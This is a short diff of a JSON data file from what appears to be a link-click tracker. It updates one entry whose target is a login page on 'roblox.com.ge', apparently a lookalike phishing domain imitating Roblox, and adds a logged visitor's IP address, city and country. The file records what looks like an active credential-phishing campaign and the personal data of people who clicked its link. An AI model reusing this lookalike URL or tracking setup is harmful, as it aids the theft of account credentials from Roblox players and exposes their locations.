@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1709,
+    "useCount": 1710,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13840,6 +13840,14 @@
         "city": "Arequipa",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777681176035,
+        "ip": "49.149.75.3",
+        "country": "Philippines",
+        "city": "Davao City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
